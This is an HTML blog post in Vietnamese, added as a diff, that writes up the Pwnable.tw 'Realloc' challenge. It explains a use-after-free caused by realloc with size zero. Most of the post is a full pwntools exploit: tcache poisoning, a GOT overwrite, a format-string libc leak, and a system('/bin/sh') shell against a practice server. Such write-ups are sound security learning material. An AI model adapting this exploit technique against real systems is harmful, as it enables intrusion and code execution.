@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – Realloc // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – Realloc"/>
+<meta name="twitter:description" content="[Pwnable.tw] – Realloc PIE bị vô hiệu hóa, điều này sẽ dễ dàng hơn cho việc leak địa chỉ.
+allocate() Đọc index đầu tiên là loại long, và giá trị chỉ có thể là 0 hoặc 1, size phải &lt; = 0x78, ở đây realloc tương đương với maloc, sau đó đọc data và gán số không ở phần cuối input.
+reallocate() Đánh số, kích thước, dữ liệu, &hellip; phân bổ lại một chuck bộ nhớ."/>
+
+    <meta property="og:title" content="[Pwnable.tw] – Realloc" />
+<meta property="og:description" content="[Pwnable.tw] – Realloc PIE bị vô hiệu hóa, điều này sẽ dễ dàng hơn cho việc leak địa chỉ.
+allocate() Đọc index đầu tiên là loại long, và giá trị chỉ có thể là 0 hoặc 1, size phải &lt; = 0x78, ở đây realloc tương đương với maloc, sau đó đọc data và gán số không ở phần cuối input.
+reallocate() Đánh số, kích thước, dữ liệu, &hellip; phân bổ lại một chuck bộ nhớ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/realloc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-31T03:11:38+07:00" />
+<meta property="article:modified_time" content="2021-12-31T03:11:38+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – Realloc</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 31, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--reallochttpspwnabletwchallenge40">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#40">Realloc</a></h2>
+<p>PIE bị vô hiệu hóa, điều này sẽ dễ dàng hơn cho việc leak địa chỉ.</p>
+<h5 id="allocate">allocate()</h5>
+<p>Đọc index đầu tiên là loại long, và giá trị chỉ có thể là 0 hoặc 1, size phải &lt; = 0x78, ở đây realloc tương đương với maloc, sau đó đọc data và gán số không ở phần cuối input.</p>
+<h5 id="reallocate">reallocate()</h5>
+<p>Đánh số, kích thước, dữ liệu, &hellip; phân bổ lại một chuck bộ nhớ.</p>
+<h5 id="rfree">rfree()</h5>
+<p>Hàm realloc() được thực hiện trên free và gán con trỏ bằng 0</p>
+<p>Sau đây là mô tả về cách realloc có thể được định vị lại cho các hoạt động heap khác nhau:</p>
+<pre><code>+ realloc (ptr, NULL): giống một phần mềm miễn phí (ptr).
+
++ realloc (ptr, size): mở rộng / thu nhỏ cơ sở chunk bộ nhớ trên kích thước được yêu cầu. Nếu giá trị kích thước giống với kích thước chunk cũ thì không có gì được thực hiện và cùng một đoạn bộ nhớ được trả về.
+
++ realloc (NULL, size): giống như malloc (size)
+</code></pre>
+<p>Lỗ hổng nằm trong hàm reallocate(), như chúng ta đã thấy trước đó rằng nếu chúng ta gọi realloc (ptr, 0) (với kích thước 0) thì cũng tốt như gọi * free (ptr). Hàm không kiểm tra kích thước phân bổ lại để chúng ta có thể chuyển đổi lệnh gọi realloc (ptr, size) thành lệnh gọi rfree(ptr) và, vì mảng lưu trữ con trỏ tới chunk bộ nhớ không được đặt thành null, nó dẫn đến việc sử dụng- use after free.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+BIN = &#34;./re-alloc&#34;
+#libc = ELF(&#34;./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so&#34;)
+libc = ELF(&#34;/lib/x86_64-linux-gnu/libc-2.31.so&#34;)
+elf = ELF(BIN)
+
+def choice(operand):
+	io.sendlineafter(&#34;Your choice:&#34;,str(operand))
+
+def alloc(index, size,data):
+	choice(1)
+	io.sendlineafter(&#34;Index:&#34;,str(index))
+	io.sendlineafter(&#34;Size:&#34;,str(size))
+	io.sendafter(&#34;Data:&#34;,data)
+
+def realloc(index, size,data):
+	choice(2)
+	io.sendlineafter(&#34;Index:&#34;,str(index))
+	io.sendlineafter(&#34;Size:&#34;,str(size))
+	io.sendafter(&#34;Data:&#34;,data)
+
+def realloc2(index, size,data):
+	choice(2)
+	io.sendlineafter(&#34;Index:&#34;,str(index))
+	io.sendlineafter(&#34;Size:&#34;,str(size))
+	# io.sendafter(&#34;Data:&#34;,data)
+
+def rfree(index):
+	choice(3)
+	io.sendlineafter(&#34;Index:&#34;,str(index))
+
+def exploit():
+	printf_plt = elf.symbols[&#34;printf&#34;]
+	atoll_plt = elf.symbols[&#34;atoll&#34;]
+	atoll_got = elf.got[&#34;atoll&#34;]
+	log.info(&#34;printf_plt:&#34;+hex(printf_plt))
+	log.info(&#34;atoll_plt:&#34;+hex(atoll_plt))
+	log.info(&#34;atoll_got:&#34;+ hex(atoll_got))
+	__breakpoint=&#34;&#34;&#34;
+		b*0x000000000040171f
+		&#34;&#34;&#34;
+	gdb.attach(io,__breakpoint)
+
+
+	alloc(0,0x28,&#34;CC&#34;)
+	realloc2(0,0,&#34;BB&#34;)
+	realloc(0,0x28,p64(atoll_got))
+	alloc(1,0x28,&#34;AAA&#34;)
+	realloc(0,0x38,&#34;AA&#34;)
+	rfree(0)
+	realloc(1,0x48,&#34;AA&#34;)
+	rfree(1)
+
+	alloc(0, 0x58, &#34;bbbb&#34;)
+	realloc2(0, 0, &#34;11&#34;)
+	realloc(0, 0x58, p64(atoll_got))
+	alloc(1, 0x58, &#34;bbbb&#34;)
+	realloc(0, 0x68, &#34;a&#34;*8)
+	rfree(0)
+	realloc(1, 0x78, &#34;a&#34;*8)
+	rfree(1)
+
+	alloc(0,0x28,p64(printf_plt))
+	io.sendlineafter(&#34;Your choice: &#34;,&#34;3&#34;)
+	io.sendlineafter(&#34;Index:&#34;,&#34;%21$p&#34;)	
+	io.recvuntil(&#34;0x&#34;)
+	leak = 	int(io.recv(12),16)
+	log.info(&#34;leak:&#34; + hex(leak))
+	libc_base = leak - 235 - libc.symbols[&#34;__libc_start_main&#34;]
+	log.info(&#34;libc_base:&#34;+hex(libc_base))
+	
+	one_gadget = 0xe2383 +libc_base
+	system = libc_base + libc.symbols[&#34;system&#34;]
+
+	io.sendlineafter(&#34;Your choice: &#34;,&#34;1&#34;)
+	io.sendafter(&#34;Index:&#34;,&#34;a&#34;)
+	io.sendafter(&#34;Size:&#34;,&#34;%88c&#34;)
+	io.sendafter(&#34;Data:&#34;,p64(system))
+
+	io.sendlineafter(&#34;Your choice: &#34;,&#34;1&#34;)
+	io.sendafter(&#34;Index:&#34;,&#34;/bin/sh\x00&#34;)
+
+	io.interactive()
+
+
+
+if __name__ == &#39;__main__&#39;:
+	context.update(arch = &#39;x86&#39;, os = &#39;linux&#39;)
+	debug = 1
+	if debug==1:
+		context.log_level=&#34;debug&#34;
+		io = process(BIN)
+	else:
+		io = remote(&#34;chall.pwnable.tw&#34;,10106)
+	exploit()
+
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
